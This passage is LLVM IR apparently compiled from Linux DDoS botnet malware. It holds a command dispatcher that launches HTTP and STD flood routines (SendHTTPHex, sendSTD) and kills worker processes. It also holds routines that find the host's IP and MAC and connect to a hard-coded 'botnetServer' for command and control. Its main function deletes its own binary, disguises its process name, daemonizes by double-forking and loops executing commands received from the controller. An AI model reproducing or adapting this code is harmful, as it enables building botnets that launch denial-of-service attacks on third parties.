  %222 = tail call i32 @atoi(i8* %221) #14
  %223 = trunc i32 %222 to i16
  %224 = load i8*, i8** %209, align 8
  %225 = tail call i32 @atoi(i8* %224) #14
  %226 = getelementptr inbounds i8*, i8** %1, i64 6
  %227 = load i8*, i8** %226, align 8
  %228 = tail call i32 @atoi(i8* %227) #14
  tail call void @SendHTTPHex(i8* %218, i8* %220, i16 zeroext %223, i8* undef, i32 %225, i32 %228)
  tail call void @exit(i32 0) #16
  unreachable

; <label>:229:                                    ; preds = %198
  %230 = tail call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.159, i64 0, i64 0)) #14
  %231 = icmp eq i32 %230, 0
  br i1 %231, label %232, label %.loopexit142

; <label>:232:                                    ; preds = %229
  %233 = icmp slt i32 %0, 4
  br i1 %233, label %.loopexit, label %234

; <label>:234:                                    ; preds = %232
  %235 = getelementptr inbounds i8*, i8** %1, i64 2
  %236 = load i8*, i8** %235, align 8
  %237 = tail call i32 @atoi(i8* %236) #14
  %238 = icmp slt i32 %237, 1
  br i1 %238, label %.loopexit, label %239

; <label>:239:                                    ; preds = %234
  %240 = getelementptr inbounds i8*, i8** %1, i64 3
  %241 = load i8*, i8** %240, align 8
  %242 = tail call i32 @atoi(i8* %241) #14
  %243 = icmp slt i32 %242, 1
  br i1 %243, label %.loopexit, label %244

; <label>:244:                                    ; preds = %239
  %245 = getelementptr inbounds i8*, i8** %1, i64 1
  %246 = load i8*, i8** %245, align 8
  %strchr131 = tail call i8* @strchr(i8* %246, i32 44)
  %247 = icmp eq i8* %strchr131, null
  br i1 %247, label %254, label %.preheader141.preheader

.preheader141.preheader:                          ; preds = %244
  br label %.preheader141

.preheader141:                                    ; preds = %.preheader141.preheader, %250
  %.sink136 = phi i8* [ null, %250 ], [ %246, %.preheader141.preheader ]
  %248 = tail call i8* @strtok(i8* %.sink136, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i64 0, i64 0)) #6
  %249 = icmp eq i8* %248, null
  br i1 %249, label %.loopexit142.loopexit, label %250

; <label>:250:                                    ; preds = %.preheader141
  %251 = tail call i32 @listFork()
  %252 = icmp eq i32 %251, 0
  br i1 %252, label %253, label %.preheader141

; <label>:253:                                    ; preds = %250
  tail call void @sendSTD(i8* nonnull %248, i32 %237, i32 %242)
  unreachable

; <label>:254:                                    ; preds = %244
  %255 = tail call i32 @listFork()
  %256 = icmp eq i32 %255, 0
  br i1 %256, label %257, label %.loopexit

; <label>:257:                                    ; preds = %254
  tail call void @sendSTD(i8* %246, i32 %237, i32 %242)
  unreachable

.loopexit142.loopexit:                            ; preds = %.preheader141
  %.pre156 = load i8*, i8** %1, align 8
  br label %.loopexit142

.loopexit142:                                     ; preds = %.loopexit142.loopexit, %229
  %258 = phi i8* [ %.pre156, %.loopexit142.loopexit ], [ %165, %229 ]
  %259 = tail call i32 @strcmp(i8* %258, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.160, i64 0, i64 0)) #14
  %260 = icmp eq i32 %259, 0
  %261 = load i64, i64* @numpids, align 8
  %262 = icmp ne i64 %261, 0
  %or.cond = and i1 %260, %262
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit142
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %275
  %.0149 = phi i64 [ %276, %275 ], [ 0, %.lr.ph.preheader ]
  %263 = load i32*, i32** @pids, align 8
  %264 = getelementptr inbounds i32, i32* %263, i64 %.0149
  %265 = load i32, i32* %264, align 4
  %266 = icmp eq i32 %265, 0
  br i1 %266, label %275, label %267

; <label>:267:                                    ; preds = %.lr.ph
  %268 = tail call i32 @getpid() #6
  %269 = icmp eq i32 %265, %268
  br i1 %269, label %275, label %270

; <label>:270:                                    ; preds = %267
  %271 = load i32*, i32** @pids, align 8
  %272 = getelementptr inbounds i32, i32* %271, i64 %.0149
  %273 = load i32, i32* %272, align 4
  %274 = tail call i32 @kill(i32 %273, i32 9) #6
  br label %275

; <label>:275:                                    ; preds = %267, %.lr.ph, %270
  %276 = add i64 %.0149, 1
  %277 = load i64, i64* @numpids, align 8
  %278 = icmp ult i64 %276, %277
  br i1 %278, label %.lr.ph, label %.loopexit.loopexit165

.loopexit.loopexit:                               ; preds = %.preheader
  br label %.loopexit

.loopexit.loopexit165:                            ; preds = %275
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit165, %.loopexit.loopexit, %.loopexit142, %254, %213, %180, %95, %20, %232, %234, %239, %201, %203, %208, %168, %170, %175, %102, %104, %109, %114, %122, %129, %32, %34, %39, %44, %49, %59, %11, %26
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #6
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.161, i64 0, i64 0)) #6
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #15
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #6
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #6
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.162, i64 0, i64 0), i32 0) #6
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.163, i64 0, i64 0)) #14
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #6
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #6
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #6
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #6
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #2

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #2

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @getEndianness() local_unnamed_addr #0 {
  ret i32 ptrtoint ([14 x i8]* @.str.165 to i32)
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @KadenCommStock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #6
  store i32 0, i32* @KadenCommStock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @botnetServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @botnetServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @ServerInfo, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #6
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #14
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #14
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 27, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %21, i32* @KadenCommStock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #8

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture readonly) local_unnamed_addr #11 {
  %3 = alloca [32 x i8], align 16
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca [10 x i8*], align 16
  %7 = load i8*, i8** %1, align 8
  %8 = tail call i32 @unlink(i8* %7) #6
  tail call void @rand_init()
  %9 = tail call i32 @rand_next()
  %10 = shl i32 %9, 2
  %11 = and i32 %10, 12
  %12 = add nuw nsw i32 %11, 12
  %13 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 0
  call void @rand_alphastr(i8* nonnull %13, i32 %12)
  %14 = zext i32 %12 to i64
  %15 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 %14
  store i8 0, i8* %15, align 4
  %16 = load i8*, i8** %1, align 8
  %17 = call i32 @util_strcpy(i8* %16, i8* nonnull %13)
  %18 = tail call i32 @rand_next()
  %19 = urem i32 %18, 6
  %20 = shl nuw nsw i32 %19, 2
  %21 = add nuw nsw i32 %20, 12
  call void @rand_alphastr(i8* nonnull %13, i32 %21)
  %22 = zext i32 %21 to i64
  %23 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 %22
  store i8 0, i8* %23, align 4
  %24 = call i32 (i32, ...) @prctl(i32 15, i8* nonnull %13) #6
  %25 = call i64 @time(i64* null) #6
  %26 = call i32 @getpid() #6
  %27 = zext i32 %26 to i64
  %28 = xor i64 %27, %25
  %29 = trunc i64 %28 to i32
  call void @srand(i32 %29) #6
  call void @rand_init()
  %30 = call i32 @getOurIP()
  %31 = call i32 @fork() #6
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %35, label %33

; <label>:33:                                     ; preds = %2
  %34 = call i32 @waitpid(i32 %31, i32* nonnull %4, i32 0) #6
  call void @exit(i32 0) #16
  unreachable

; <label>:35:                                     ; preds = %2
  %36 = call i32 @fork() #6
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %39, label %38

; <label>:38:                                     ; preds = %35
  call void @exit(i32 0) #16
  unreachable

; <label>:39:                                     ; preds = %35
  %40 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i64 0, i64 0)) #6
  %41 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #6
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 1
  %44 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 0
  br label %.backedge78

.backedge78.loopexit:                             ; preds = %.backedge
  br label %.backedge78.backedge

.backedge78:                                      ; preds = %.backedge78.backedge, %39
  %45 = call i32 @initConnection()
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %47, label %.backedge78.backedge

; <label>:47:                                     ; preds = %.backedge78
  %48 = load i32, i32* @KadenCommStock, align 4
  %49 = call i8* @getBuildz()
  %50 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %51 = call i8* @inet_ntoa(i32 %50) #6
  %52 = call i32 (i32, i8*, ...) @botnetPrint(i32 %48, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.170, i64 0, i64 0), i8* %49, i8* %51, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i32 ptrtoint ([14 x i8]* @.str.165 to i32), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.171, i64 0, i64 0))
  %53 = load i32, i32* @KadenCommStock, align 4
  %54 = call i32 @recvLine(i32 %53, i8* nonnull %42, i32 4096)
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %.backedge78.backedge, label %.preheader76.preheader

.backedge78.backedge:                             ; preds = %47, %.backedge78, %.backedge78.loopexit
  br label %.backedge78

.preheader76.preheader:                           ; preds = %47
  br label %.preheader76

.preheader76:                                     ; preds = %.preheader76.preheader, %.backedge
  %56 = phi i32 [ %150, %.backedge ], [ %54, %.preheader76.preheader ]
  %57 = load i64, i64* @numpids, align 8
  %58 = icmp eq i64 %57, 0
  br i1 %58, label %._crit_edge92, label %.lr.ph91.preheader

.lr.ph91.preheader:                               ; preds = %.preheader76
  br label %.lr.ph91

.lr.ph91:                                         ; preds = %.lr.ph91.preheader, %.lr.ph91._crit_edge
  %indvars.iv = phi i64 [ %64, %.lr.ph91._crit_edge ], [ 0, %.lr.ph91.preheader ]
  %59 = load i32*, i32** @pids, align 8
  %60 = getelementptr inbounds i32, i32* %59, i64 %indvars.iv
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @waitpid(i32 %61, i32* null, i32 1) #6
  %63 = icmp sgt i32 %62, 0
  %64 = add nuw i64 %indvars.iv, 1
  br i1 %63, label %.preheader, label %.lr.ph91._crit_edge

.preheader:                                       ; preds = %.lr.ph91
  %65 = load i64, i64* @numpids, align 8
  %66 = icmp ult i64 %64, %65
  %67 = load i32*, i32** @pids, align 8
  %68 = trunc i64 %indvars.iv to i32
  br i1 %66, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %69 = trunc i64 %64 to i32
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %70 = phi i32* [ %79, %.lr.ph ], [ %67, %.lr.ph.preheader ]
  %71 = phi i64 [ %76, %.lr.ph ], [ %64, %.lr.ph.preheader ]
  %.06783 = phi i32 [ %.067, %.lr.ph ], [ %69, %.lr.ph.preheader ]
  %.067.in82 = phi i32 [ %.06783, %.lr.ph ], [ %68, %.lr.ph.preheader ]
  %72 = getelementptr inbounds i32, i32* %70, i64 %71
  %73 = load i32, i32* %72, align 4
  %74 = zext i32 %.067.in82 to i64
  %75 = getelementptr inbounds i32, i32* %70, i64 %74
  store i32 %73, i32* %75, align 4
  %.067 = add i32 %.06783, 1
  %76 = zext i32 %.067 to i64
  %77 = load i64, i64* @numpids, align 8
  %78 = icmp ult i64 %76, %77
  %79 = load i32*, i32** @pids, align 8
  br i1 %78, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.067.in.lcssa = phi i32 [ %68, %.preheader ], [ %.06783, %._crit_edge.loopexit ]
  %.lcssa = phi i32* [ %67, %.preheader ], [ %79, %._crit_edge.loopexit ]
  %80 = zext i32 %.067.in.lcssa to i64
  %81 = getelementptr inbounds i32, i32* %.lcssa, i64 %80
  store i32 0, i32* %81, align 4
  %82 = load i64, i64* @numpids, align 8
  %83 = add i64 %82, -1
  store i64 %83, i64* @numpids, align 8
  %84 = shl i64 %82, 2
  %85 = call noalias i8* @malloc(i64 %84) #6
  %86 = bitcast i8* %85 to i32*
  %87 = icmp eq i64 %83, 0
  %88 = load i32*, i32** @pids, align 8
  br i1 %87, label %._crit_edge88, label %.lr.ph87.preheader

.lr.ph87.preheader:                               ; preds = %._crit_edge
  br label %.lr.ph87

.lr.ph87:                                         ; preds = %.lr.ph87.preheader, %.lr.ph87
  %89 = phi i64 [ %94, %.lr.ph87 ], [ 0, %.lr.ph87.preheader ]
  %.16885 = phi i32 [ %93, %.lr.ph87 ], [ 0, %.lr.ph87.preheader ]
  %90 = getelementptr inbounds i32, i32* %88, i64 %89
  %91 = load i32, i32* %90, align 4
  %92 = getelementptr inbounds i32, i32* %86, i64 %89
  store i32 %91, i32* %92, align 4
  %93 = add i32 %.16885, 1
  %94 = zext i32 %93 to i64
  %95 = icmp ult i64 %94, %83
  br i1 %95, label %.lr.ph87, label %._crit_edge88.loopexit

._crit_edge88.loopexit:                           ; preds = %.lr.ph87
  br label %._crit_edge88

._crit_edge88:                                    ; preds = %._crit_edge88.loopexit, %._crit_edge
  %96 = bitcast i32* %88 to i8*
  call void @free(i8* %96) #6
  store i8* %85, i8** bitcast (i32** @pids to i8**), align 8
  br label %.lr.ph91._crit_edge

.lr.ph91._crit_edge:                              ; preds = %.lr.ph91, %._crit_edge88
  %sext = shl i64 %64, 32
  %97 = ashr exact i64 %sext, 32
  %98 = load i64, i64* @numpids, align 8
  %99 = icmp ult i64 %97, %98
  br i1 %99, label %.lr.ph91, label %._crit_edge92.loopexit

._crit_edge92.loopexit:                           ; preds = %.lr.ph91._crit_edge
  br label %._crit_edge92

._crit_edge92:                                    ; preds = %._crit_edge92.loopexit, %.preheader76
  %100 = sext i32 %56 to i64
  %101 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 %100
  store i8 0, i8* %101, align 1
  call void @trim(i8* nonnull %42)
  %102 = load i8, i8* %42, align 16
  %103 = icmp eq i8 %102, 33
  br i1 %103, label %.preheader105.preheader, label %.backedge

.preheader105.preheader:                          ; preds = %._crit_edge92
  br label %.preheader105

.preheader105:                                    ; preds = %.preheader105.preheader, %105
  %.065 = phi i8* [ %106, %105 ], [ %43, %.preheader105.preheader ]
  %104 = load i8, i8* %.065, align 1
  switch i8 %104, label %105 [
    i8 0, label %.backedge.loopexit119
    i8 32, label %107
  ]

; <label>:105:                                    ; preds = %.preheader105
  %106 = getelementptr inbounds i8, i8* %.065, i64 1
  br label %.preheader105

; <label>:107:                                    ; preds = %.preheader105
  store i8 0, i8* %.065, align 1
  %108 = call i64 @strlen(i8* %43) #14
  %109 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 %108
  %110 = getelementptr inbounds i8, i8* %109, i64 2
  br label %111

; <label>:111:                                    ; preds = %116, %107
  %112 = call i64 @strlen(i8* %110) #14
  %113 = add i64 %112, -1
  %114 = getelementptr inbounds i8, i8* %110, i64 %113
  %115 = load i8, i8* %114, align 1
  switch i8 %115, label %.preheader74.preheader [
    i8 13, label %116
    i8 10, label %116
  ]

.preheader74.preheader:                           ; preds = %111
  br label %.preheader74

; <label>:116:                                    ; preds = %111, %111
  store i8 0, i8* %114, align 1
  br label %111

.preheader74:                                     ; preds = %.preheader74.preheader, %118
  %.066 = phi i8* [ %119, %118 ], [ %110, %.preheader74.preheader ]
  %117 = load i8, i8* %.066, align 1
  switch i8 %117, label %118 [
    i8 32, label %120
    i8 0, label %120
  ]

; <label>:118:                                    ; preds = %.preheader74
  %119 = getelementptr inbounds i8, i8* %.066, i64 1
  br label %.preheader74

; <label>:120:                                    ; preds = %.preheader74, %.preheader74
  store i8 0, i8* %.066, align 1
  %121 = getelementptr inbounds i8, i8* %.066, i64 1
  %122 = load i8, i8* %110, align 1
  %123 = icmp eq i8 %122, 0
  br i1 %123, label %._crit_edge96, label %.lr.ph95.preheader

.lr.ph95.preheader:                               ; preds = %120
  br label %.lr.ph95

.lr.ph95:                                         ; preds = %.lr.ph95.preheader, %.lr.ph95
  %124 = phi i8 [ %129, %.lr.ph95 ], [ %122, %.lr.ph95.preheader ]
  %.06493 = phi i8* [ %128, %.lr.ph95 ], [ %110, %.lr.ph95.preheader ]
  %125 = zext i8 %124 to i32
  %126 = call i32 @toupper(i32 %125) #14
  %127 = trunc i32 %126 to i8
  store i8 %127, i8* %.06493, align 1
  %128 = getelementptr inbounds i8, i8* %.06493, i64 1
  %129 = load i8, i8* %128, align 1
  %130 = icmp eq i8 %129, 0
  br i1 %130, label %._crit_edge96.loopexit, label %.lr.ph95

._crit_edge96.loopexit:                           ; preds = %.lr.ph95
  br label %._crit_edge96

._crit_edge96:                                    ; preds = %._crit_edge96.loopexit, %120
  %131 = call i8* @strtok(i8* %121, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i64 0, i64 0)) #6
  store i8* %110, i8** %44, align 16
  %132 = icmp eq i8* %131, null
  br i1 %132, label %._crit_edge101.thread, label %.lr.ph100.preheader

.lr.ph100.preheader:                              ; preds = %._crit_edge96
  br label %.lr.ph100

._crit_edge101.thread:                            ; preds = %._crit_edge96
  call void @processCmd(i32 1, i8** nonnull %44)
  br label %.backedge

.lr.ph100:                                        ; preds = %.lr.ph100.preheader, %145
  %.06298 = phi i8* [ %146, %145 ], [ %131, %.lr.ph100.preheader ]
  %.06397 = phi i32 [ %.1, %145 ], [ 1, %.lr.ph100.preheader ]
  %133 = load i8, i8* %.06298, align 1
  %134 = icmp eq i8 %133, 10
  br i1 %134, label %145, label %135

; <label>:135:                                    ; preds = %.lr.ph100
  %136 = call i64 @strlen(i8* nonnull %.06298) #14
  %137 = add i64 %136, 1
  %138 = call noalias i8* @malloc(i64 %137) #6
  %139 = sext i32 %.06397 to i64
  %140 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %139
  store i8* %138, i8** %140, align 8
  %141 = call i64 @strlen(i8* nonnull %.06298) #14
  %142 = add i64 %141, 1
  call void @llvm.memset.p0i8.i64(i8* %138, i8 0, i64 %142, i32 1, i1 false)
  %143 = call i8* @strcpy(i8* %138, i8* nonnull %.06298) #6
  %144 = add nsw i32 %.06397, 1
  br label %145

; <label>:145:                                    ; preds = %.lr.ph100, %135
  %.1 = phi i32 [ %144, %135 ], [ %.06397, %.lr.ph100 ]
  %146 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i64 0, i64 0)) #6
  %147 = icmp eq i8* %146, null
  br i1 %147, label %._crit_edge101, label %.lr.ph100

._crit_edge101:                                   ; preds = %145
  call void @processCmd(i32 %.1, i8** nonnull %44)
  %148 = icmp sgt i32 %.1, 1
  br i1 %148, label %.lr.ph104.preheader, label %.backedge

.lr.ph104.preheader:                              ; preds = %._crit_edge101
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph104

.backedge.loopexit:                               ; preds = %.lr.ph104
  br label %.backedge

.backedge.loopexit119:                            ; preds = %.preheader105
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit119, %.backedge.loopexit, %._crit_edge101.thread, %._crit_edge101, %._crit_edge92
  %149 = load i32, i32* @KadenCommStock, align 4
  %150 = call i32 @recvLine(i32 %149, i8* nonnull %42, i32 4096)
  %151 = icmp eq i32 %150, -1
  br i1 %151, label %.backedge78.loopexit, label %.preheader76

.lr.ph104:                                        ; preds = %.lr.ph104.preheader, %.lr.ph104
  %indvars.iv111 = phi i64 [ %indvars.iv.next112, %.lr.ph104 ], [ 1, %.lr.ph104.preheader ]
  %152 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %indvars.iv111
  %153 = load i8*, i8** %152, align 8
  call void @free(i8* %153) #6
  %indvars.iv.next112 = add nuw nsw i64 %indvars.iv111, 1
  %exitcond = icmp eq i64 %indvars.iv.next112, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph104
}

; Function Attrs: nounwind
declare i32 @unlink(i8* nocapture readonly) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) local_unnamed_addr #2

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #2

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

